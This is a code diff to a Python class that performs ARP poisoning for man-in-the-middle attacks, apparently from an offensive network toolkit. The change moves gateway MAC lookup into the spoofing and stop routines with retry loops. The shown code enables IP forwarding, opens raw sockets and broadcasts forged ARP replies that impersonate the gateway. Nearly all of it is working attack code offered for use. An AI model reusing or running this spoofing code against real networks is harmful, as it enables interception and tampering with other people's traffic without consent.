@@ -30,7 +30,7 @@ class ARPspoof(object):
 
 	name = "ARP poisoner spoofer"
 	desc = "Use arp spoofing in order to realize a man-in-the-middle attack"
-	version = "0.4"
+	version = "0.5"
 
 	def __init__(self, gateway, targets, interface, myip, mymac):
 
@@ -38,22 +38,19 @@ class ARPspoof(object):
 			self.gateway = str(IPAddress(gateway))
 		except AddrFormatError as e:
 			print "[-] Select a valid IP address as gateway"
-		self.gateway_mac = self.resolve_mac(gateway)
-		if not self.gateway_mac:
-			print "[-] Error: Couldn't retrieve MAC address from gateway."
 		else:
 			iptables()
 			set_ip_forwarding(1)
-			self.range      = False
-			self.targets	= self.get_range(targets)
-			self.send	= True
-			self.interval	= 3
-			self.interface	= interface
-			self.myip	= myip
-			self.mymac	= mymac
-			self.arp_cache	= {}
-			self.socket     = conf.L3socket(iface=self.interface)
-			self.socket2    = conf.L2socket(iface=self.interface)
+			self.gateway_mac = None
+			self.range       = False
+			self.targets	 = self.get_range(targets)
+			self.send	 = True
+			self.interval	 = 3
+			self.interface	 = interface
+			self.myip	 = myip
+			self.mymac	 = mymac
+			self.socket      = conf.L3socket(iface=self.interface)
+			self.socket2     = conf.L2socket(iface=self.interface)
 
 	def start(self):
 		t = threading.Thread(name='ARPspoof', target=self.spoof)
@@ -103,6 +100,17 @@ class ARPspoof(object):
 			if self.targets is None:
 				self.socket2.send(Ether(src=self.mymac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=self.mymac, psrc=self.gateway, op="is-at"))
 			elif self.targets:
+				try:
+					self.gateway_mac = self.resolve_mac(self.gateway)
+					while not self.gateway_mac:
+						print "[-] Error: Couldn't retrieve MAC address from gateway, retrying..."
+						self.gateway_mac = self.resolve_mac(self.gateway)
+				except KeyboardInterrupt:
+					print "[!] Aborted."
+					set_ip_forwarding(0)
+					self.socket.close()
+					self.socket2.close()
+					return
 				for target in self.targets:
 					targetip = str(target)
 					if (targetip != self.myip):
@@ -117,6 +125,17 @@ class ARPspoof(object):
 			sleep(self.interval)
 
 	def stop(self):
+		try:
+			self.gateway_mac = self.resolve_mac(self.gateway)
+			while not self.gateway_mac:
+				print "[-] Error: Couldn't retrieve MAC address from gateway, retrying..."
+				self.gateway_mac = self.resolve_mac(self.gateway)
+		except KeyboardInterrupt:
+			print "[!] Aborted."
+			set_ip_forwarding(0)
+			self.socket.close()
+			self.socket2.close()
+			return
 		self.send = False
 		sleep(1)
 		count = 4
